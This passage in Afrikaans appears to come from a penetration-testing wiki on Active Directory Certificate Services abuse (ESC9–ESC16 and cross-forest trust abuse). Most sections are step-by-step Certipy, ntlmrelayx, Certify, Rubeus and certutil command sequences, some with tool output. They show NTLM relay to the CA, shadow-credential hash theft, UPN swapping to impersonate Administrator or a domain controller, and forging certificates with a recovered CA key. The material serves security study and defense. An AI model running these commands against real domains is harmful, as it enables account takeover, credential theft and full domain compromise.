#### Misbruik met [Certipy](https://github.com/ly4k/Certipy)

Die versoek vir 'n sertifikaat word standaard deur Certipy gemaak gebaseer op die sjabloon `Machine` of `User`, wat bepaal word deur of die rekeningnaam wat gerelayed word op `$` eindig. Die spesifikasie van 'n alternatiewe sjabloon kan bereik word deur die gebruik van die `-template` parameter.

'n Tegniek soos [PetitPotam](https://github.com/ly4k/PetitPotam) kan dan gebruik word om autentisering af te dwing. Wanneer daar met domeincontrollers gewerk word, is die spesifikasie van `-template DomainController` vereis.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Verduideliking

Die nuwe waarde **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) vir **`msPKI-Enrollment-Flag`**, verwys na as ESC9, verhoed die insluiting van die **nuwe `szOID_NTDS_CA_SECURITY_EXT` security extension** in 'n sertifikaat. Hierdie vlag word relevant wanneer `StrongCertificateBindingEnforcement` op `1` gestel is (die verstekinstelling), wat verskil van 'n instelling van `2`. Dit is meer betekenisvol in scenario's waar 'n swakker sertifikaatkartering vir Kerberos of Schannel uitgebuit kan word (soos in ESC10), aangesien die afwesigheid van ESC9 die vereistes nie sou verander nie.

Die toestande waaronder hierdie vlag se instelling betekenisvol raak, sluit in:

- `StrongCertificateBindingEnforcement` is nie aangepas na `2` nie (met die verstek op `1`), of `CertificateMappingMethods` sluit die `UPN` vlag in.
- Die sertifikaat is gemerk met die `CT_FLAG_NO_SECURITY_EXTENSION` vlag binne die `msPKI-Enrollment-Flag` instelling.
- Enige client authentication EKU word deur die sertifikaat gespesifiseer.
- `GenericWrite` regte is beskikbaar oor enige rekening om 'n ander te kompromitteer.

### Misbruikscenario

Stel `John@corp.local` het `GenericWrite` regte oor `Jane@corp.local`, met die doel om `Administrator@corp.local` te kompromitteer. Die `ESC9` certificate template, waarvoor `Jane@corp.local` aangeteken mag word, is gekonfigureer met die `CT_FLAG_NO_SECURITY_EXTENSION` vlag in sy `msPKI-Enrollment-Flag` instelling.

Aanvanklik word `Jane` se hash verkry met Shadow Credentials, danksy `John` se `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Daarna word `Jane` se `userPrincipalName` gewysig na `Administrator`, met opset die `@corp.local` domeingedeelte weggelaat:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hierdie wysiging oortree nie die beperkings nie, aangesien `Administrator@corp.local` steeds onderskeibaar bly as die `userPrincipalName` van `Administrator`.

Daarna word die `ESC9` sertifikaatsjabloon, gemerk as kwesbaar, aangevra as `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Daar word opgemerk dat die sertifikaat se `userPrincipalName` `Administrator` weerspieël, sonder enige “object SID”.

Die `userPrincipalName` van `Jane` word dan teruggestel na haar oorspronklike, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die poging om met die uitgereikte sertifikaat te autentiseer lewer nou die NT-hash van `Administrator@corp.local`. Die opdrag moet `-domain <domain>` insluit weens die sertifikaat se gebrek aan domeinspesifikasie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Verduideliking

- Die verstekwaarde vir `CertificateMappingMethods` onder `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), vroeër gestel op `0x1F`.
- Die verstekinstelling vir `StrongCertificateBindingEnforcement` onder `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, vroeër `0`.

### Geval 1

Wanneer `StrongCertificateBindingEnforcement` as `0` gekonfigureer is.

### Geval 2

As `CertificateMappingMethods` die `UPN`-bit (`0x4`) insluit.

### Misbruikgeval 1

Met `StrongCertificateBindingEnforcement` gekonfigureer as `0`, kan 'n account A met `GenericWrite` toestemmings uitgebuit word om enige account B te kompromitteer.

Byvoorbeeld, met `GenericWrite` toestemmings oor `Jane@corp.local`, mik 'n aanvaller om `Administrator@corp.local` te kompromitteer. Die prosedure weerspieël ESC9 en maak dit moontlik om enige certificate template te gebruik.

Aanvanklik word `Jane` se hash verkry met Shadow Credentials, deur die `GenericWrite` uit te buit.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Daarna word `Jane` se `userPrincipalName` verander na `Administrator`, en die `@corp.local` gedeelte word doelbewus weggelaat om 'n beperkingsoortreding te voorkom.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Daarna word ’n sertifikaat wat kliëntverifikasie moontlik maak as `Jane` aangevra, met die standaard `User`-sjabloon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word dan teruggestel na sy oorspronklike waarde, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Deur met die verkrygde sertifikaat te verifieer, sal die NT-hash van `Administrator@corp.local` verkry word, wat vereis dat die domein in die opdrag gespesifiseer word aangesien daar geen domeinbesonderhede in die sertifikaat is nie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Misbruikgeval 2

Met die `CertificateMappingMethods` wat die `UPN` bitvlag (`0x4`) bevat, kan 'n rekening A met `GenericWrite` toestemmings enige rekening B kompromitteer wat nie 'n `userPrincipalName` eienskap het nie, insluitend masjienrekeninge en die ingeboude domeinadministrateur `Administrator`.

Hier is die doel om `DC$@corp.local` te kompromitteer, beginnende met die verkryging van `Jane` se hash deur Shadow Credentials, deur gebruik te maak van die `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` se `userPrincipalName` word dan op `DC$@corp.local` gestel.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
'n sertifikaat vir kliëntverifikasie word as `Jane` aangevra met die standaard `User` sjabloon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word na hierdie proses na die oorspronklike waarde teruggestel.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Om via Schannel te verifieer, word Certipy se `-ldap-shell` opsie gebruik, wat suksesvolle verifikasie aandui as `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Deur die LDAP-shell maak opdragte soos `set_rbcd` Resource-Based Constrained Delegation (RBCD)-aanvalle moontlik, wat die domain controller moontlik kan kompromitteer.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Hierdie kwesbaarheid strek ook tot enige gebruikersrekening wat 'n `userPrincipalName` ontbreek of waar dit nie met die `sAMAccountName` ooreenstem nie, met die standaard `Administrator@corp.local` as 'n primêre teiken weens sy verhoogde LDAP-regte en die afwesigheid van 'n `userPrincipalName` standaard.

## Relaying NTLM to ICPR - ESC11

### Verduideliking

If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Jy kan `certipy` gebruik om te nagaan of `Enforce Encryption for Requests` gedeaktiveer is, en certipy sal `ESC11`-kwetsbaarhede wys.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Dit moet 'n relay server opstel:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Vir domain controllers moet ons `-template` in DomainController spesifiseer.

Of gebruik [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Verduideliking

Administrateurs kan die Sertifikaatowerheid opstel om dit op 'n eksterne toestel soos die "Yubico YubiHSM2" te stoor.

If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.

Hierdie key/password word in die register gestoor onder `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Misbruikscenario

As die CA se private sleutel op 'n fisiese USB-toestel gestoor is wanneer jy shell-toegang kry, is dit moontlik om die sleutel te herstel.

Eerstens moet jy die CA-sertifikaat bekom (dit is publiek) en dan:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Laastens, gebruik die certutil `-sign` kommando om 'n nuwe willekeurige sertifikaat te vervals deur die CA-sertifikaat en sy privaat sleutel te gebruik.

## OID Group Link Abuse - ESC13

### Verduideliking

Die `msPKI-Certificate-Policy` attribuut maak dit moontlik dat die uitreikingsbeleid by die sertifikaat-sjabloon gevoeg word. Die `msPKI-Enterprise-Oid` objekte wat verantwoordelik is vir die uitreiking van beleide, kan in die Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) van die PKI OID container ontdek word. 'n Beleid kan aan 'n AD group gekoppel word deur hierdie objek se `msDS-OIDToGroupLink` attribuut, wat 'n stelsel in staat stel om 'n gebruiker wat die sertifikaat voorlê, te magtig asof hy 'n lid van die groep is. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Met ander woorde, as 'n gebruiker toestemming het om 'n sertifikaat te registreer en die sertifikaat aan 'n OID group gekoppel is, kan die gebruiker die voorregte van daardie groep erf.

Gebruik [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) om OIDToGroupLink te vind:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Vind 'n gebruikerspermissie wat gebruik kan word met `certipy find` of `Certify.exe find /showAllPermissions`.

As `John` toestemming het om op `VulnerableTemplate` te registreer, kan die gebruiker die voorregte van die groep `VulnerableGroup` erf.

Alles wat gedoen moet word, is om net die template te spesifiseer; dit sal 'n sertifikaat kry met OIDToGroupLink-regte.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kwesbare Sertifikaat Hernuwingskonfigurasie - ESC14

### Verklaring

Die beskrywing by https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is uiters deeglik. Hieronder is 'n aanhaling van die oorspronklike teks.

ESC14 spreek kwesbaarhede aan wat voortspruit uit "weak explicit certificate mapping", hoofsaaklik deur die misbruik of onveilige konfigurasie van die `altSecurityIdentities`-attribuut op Active Directory gebruikers- of rekenaarsrekeninge. Hierdie multi-waarde attribuut laat administrateurs toe om X.509-sertifikate handmatig met 'n AD-rekening te koppel vir verifikasiedoeleindes. Wanneer dit ingevul is, kan hierdie eksplisiete mappies die standaard sertifikaat-mappinglogika oorverhoë, wat tipies staatmaak op UPNs of DNS-name in die SAN van die sertifikaat, of die SID wat ingebed is in die `szOID_NTDS_CA_SECURITY_EXT` sekuriteitsuitbreiding.

'n "Swakke" mapping gebeur wanneer die stringwaarde wat binne die `altSecurityIdentities`-attribuut gebruik word om 'n sertifikaat te identifiseer te wyd is, maklik raaiselbaar, staatmaak op nie-unikale sertifikaatvelde, of maklik te spoof-dele van sertifikate gebruik. As 'n aanvaller 'n sertifikaat kan verkry of vervaardig waarvan die attribuut ooreenstem met so 'n swak gedefinieerde eksplisiete mapping vir 'n bevoorregte rekening, kan hulle daardie sertifikaat gebruik om as daardie rekening te verifieer en hom te impersonate.

Voorbeelde van potensieel swak `altSecurityIdentities` mapping-strings sluit in:

- Mapping uitsluitlik deur 'n algemene Subject Common Name (CN): bv. `X509:<S>CN=SomeUser`. 'n Aanvaller mag 'n sertifikaat met hierdie CN van 'n minder veilige bron kan verkry.
- Gebruik van oormatig generiese Issuer Distinguished Names (DNs) of Subject DNs sonder verdere kwalifikasie soos 'n spesifieke serial number of subject key identifier: bv. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Gebruik van ander voorspelbare patrone of nie-kriptografiese identifiseerders wat 'n aanvaller moontlik in 'n sertifikaat wat hulle wettiglik kan verkry of vervals (indien hulle 'n CA gekompromitteer het of 'n kwesbare sjabloon soos in ESC1 gevind het) kan bevredig.

Die `altSecurityIdentities`-attribuut ondersteun verskeie formate vir mapping, soos:

- `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
- `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)

Die veiligheid van hierdie mappings hang sterk af van die spesifisiteit, uniekheid en kriptografiese sterkte van die gekose sertifikaat-identifiseerders wat in die mapping-string gebruik word. Selfs met sterk sertifikaat-bindingsmodusse geaktiveer op Domain Controllers (wat hoofsaaklik implisiete mappings gebaseer op SAN UPNs/DNS en die SID-uitbreiding beïnvloed), kan 'n swak gekonfigureerde `altSecurityIdentities`-inskrywing steeds 'n direkte pad vir impersonasie bied as die mappinglogika self gebrekkig of te permissief is.

### Misbruikscenario

ESC14 rig op **eksplisiete sertifikaat-mappings** in Active Directory (AD), spesifiek die `altSecurityIdentities`-attribuut. As hierdie attribuut gestel is (op ontwerp of deur wanopstelling), kan aanvallers rekeninge impersonate deur sertifikate voor te lê wat met die mapping ooreenstem.

#### Scenario A: Aanvaller kan na `altSecurityIdentities` skryf

**Voorwaarde**: Aanvaller het skryfpermissies op die teikenrekening se `altSecurityIdentities`-attribuut of die permissie om dit toe te ken in die vorm van een van die volgende permissies op die teiken AD-objek:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Teiken het Swakke Mapping via X509RFC822 (E-pos)

- **Voorwaarde**: Die teiken het 'n swak X509RFC822-mapping in altSecurityIdentities. 'n Aanvaller kan die slagoffer se mail-attribuut stel om te pas by die teiken se X509RFC822-naam, 'n sertifikaat as die slagoffer registreer, en dit gebruik om as die teiken te verifieer.

#### Scenario C: Teiken het X509IssuerSubject Mapping

- **Voorwaarde**: Die teiken het 'n swak X509IssuerSubject eksplisiete mapping in `altSecurityIdentities`. Die aanvaller kan die `cn` of `dNSHostName`-attribuut op 'n slagoffer-prinsipaal stel om by die onderwerp van die teiken se X509IssuerSubject-mapping te pas. Daarna kan die aanvaller 'n sertifikaat as die slagoffer registreer en hierdie sertifikaat gebruik om as die teiken te verifieer.

#### Scenario D: Teiken het X509SubjectOnly Mapping

- **Voorwaarde**: Die teiken het 'n swak X509SubjectOnly eksplisiete mapping in `altSecurityIdentities`. Die aanvaller kan die `cn` of `dNSHostName`-attribuut op 'n slagoffer-prinsipaal stel om by die onderwerp van die teiken se X509SubjectOnly-mapping te pas. Daarna kan die aanvaller 'n sertifikaat as die slagoffer registreer en hierdie sertifikaat gebruik om as die teiken te verifieer.

### konkrete operasies
#### Scenario A

Versoek 'n sertifikaat van die sertifikaatsjabloon `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Stoor en omskep die sertifikaat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Verifieer (met die sertifikaat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Opruiming (opsioneel)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Toepassingsbeleide (CVE-2024-49019) - ESC15

### Verduideliking

Die beskrywing by https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc is buitengewoon deeglik. Hieronder is 'n aanhaling van die oorspronklike teks.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Misbruik

Die volgende verwys na [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), Klik om meer gedetailleerde gebruiksmetodes te sien.

Die `find`-opdrag van Certipy kan help om V1-sjablone te identifiseer wat moontlik vatbaar is vir ESC15 indien die CA nie gepatch is nie.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direkte nabootsing via Schannel

**Stap 1: Versoek 'n sertifikaat en voeg die Application Policy "Client Authentication" en teiken UPN in.** Aanvaller `attacker@corp.local` teiken `administrator@corp.local` deur die "WebServer" V1 template te gebruik (wat enrollee-supplied subject toelaat).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Die kwesbare V1-sjabloon met "Inskrywer verskaf onderwerp".
- `-application-policies 'Client Authentication'`: Voeg die OID `1.3.6.1.5.5.7.3.2` by die Application Policies-uitbreiding van die CSR.
- `-upn 'administrator@corp.local'`: Stel die UPN in die SAN vir impersonasie.

**Stap 2: Verifieer via Schannel (LDAPS) met die verkrygde sertifikaat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Stap 1: Versoek 'n sertifikaat van 'n V1-sjabloon (met "Enrollee supplies subject"), deur die "Certificate Request Agent" Application Policy in te spuit.** Hierdie sertifikaat is bedoel vir die aanvaller (`attacker@corp.local`) om 'n enrollment agent te word. Geen UPN word hier vir die aanvaller se eie identiteit gespesifiseer nie, aangesien die doel die agentvermoë is.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Voeg OID `1.3.6.1.4.1.311.20.2.1` in.

**Stap 2: Gebruik die "agent" certificate om 'n certificate aan te vra namens 'n geteikende bevoorregte gebruiker.** Dit is 'n ESC3-like stap, wat die certificate van Stap 1 as die agent certificate gebruik.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Stap 3: Outentiseer as die bevoorregte gebruiker met die "on-behalf-of" sertifikaat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Sekuriteitsuitbreiding gestrem op CA (Globaal)-ESC16

### Verduideliking

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** verwys na 'n scenario waar, indien die konfigurasie van AD CS nie afdwing dat die **szOID_NTDS_CA_SECURITY_EXT**-uitbreiding in alle sertifikate ingesluit word nie, 'n aanvaller dit kan uitbuit deur:

1. Versoek 'n sertifikaat **sonder SID binding**.

2. Gebruik hierdie sertifikaat **vir outentisering as enige rekening**, soos om 'n hoë-privilege-rekening voor te gee (bv. 'n Domeinadministrateur).

Jy kan ook na hierdie artikel verwys om meer oor die gedetaileerde beginsel te leer:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Misbruik

Die volgende verwys na [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Klik om meer gedetaileerde gebruiksmetodes te sien.

Om te identifiseer of die Active Directory Certificate Services (AD CS) omgewing vatbaar is vir **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Step 1: Lees aanvanklike UPN van die slagofferrekening (Opsioneel - vir herstel).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Stap 2: Werk die slagofferrekening se UPN by na die teikenadministrateur se `sAMAccountName`.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Stap 3: (Indien nodig) Verkry credentials vir die "victim" rekening (bv. via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Stap 4: Versoek 'n sertifikaat as die "victim" gebruiker vanaf _enige geskikte kliëntverifikasie-sjabloon_ (bv. "User") op die ESC16-kwesbare CA.** Omdat die CA kwesbaar is vir ESC16, sal dit outomaties die SID-sekuriteitsuitbreiding uit die uitgereikte sertifikaat weglaat, ongeag die sjabloon se spesifieke instellings vir hierdie uitbreiding. Stel die Kerberos credential cache-omgewingsveranderlike (shell-opdrag):
```bash
export KRB5CCNAME=victim.ccache
```
Vra dan die sertifikaat aan:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Stap 5: Herstel die UPN van die "slagoffer"-rekening.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Stap 6: Meld aan as die teiken-administrateur.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kompromittering van forests met sertifikate — verduidelik in passiewe vorm

### Breek van forest-trusts deur gekompromitteerde CAs

Die konfigurasie vir **cross-forest enrollment** word relatief eenvoudig gemaak. Die **root CA-sertifikaat** van die resource forest word deur administrateurs **gepubliseer na die account forests**, en die **enterprise CA**-sertifikate van die resource forest word **bygevoeg tot die `NTAuthCertificates` en AIA containers in elke account forest**. Om dit te verduidelik, gee hierdie reëlings die **CA in die resource forest volledige beheer** oor alle ander forests waarvoor dit PKI bestuur. Indien hierdie CA **deur aanvallers gekompromitteer word**, kan sertifikate vir alle gebruikers in beide die resource en account forests deur hulle **vervals word**, waardeur die sekuriteitsgrens van die forest gebreek word.

### Inskrywingsprivilege wat aan vreemde principals gegee word

In multi-forest-omgewings is versigtigheid nodig met betrekking tot Enterprise CAs wat **sertifikaattemplates publiseer** wat **Authenticated Users of foreign principals** (gebruikers/groepe buite die forest waartoe die Enterprise CA behoort) **inskrywings- en wysigingsregte** toelaat.\
By outentisering oor 'n trust word die **Authenticated Users SID** deur AD by die gebruiker se token gevoeg. Dus, as 'n domein 'n Enterprise CA het met 'n template wat **Authenticated Users inskrywingsregte toelaat**, kan 'n template moontlik **deur 'n gebruiker van 'n ander forest ingeskryf word**. Net so, as **inskrywingsregte eksplisiet aan 'n foreign principal deur 'n template gegee word**, word 'n **cross-forest access-control relationship** daardeur geskep, wat 'n principal van een forest in staat stel om **in 'n template van 'n ander forest in te skryf**.

Albei scenario's lei tot 'n **toename in die attack surface** van een forest na 'n ander. Die instellings van die sertifikaattemplate kan deur 'n aanvaller uitgebuit word om bykomende voorregte in 'n vreemde domein te bekom.

## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
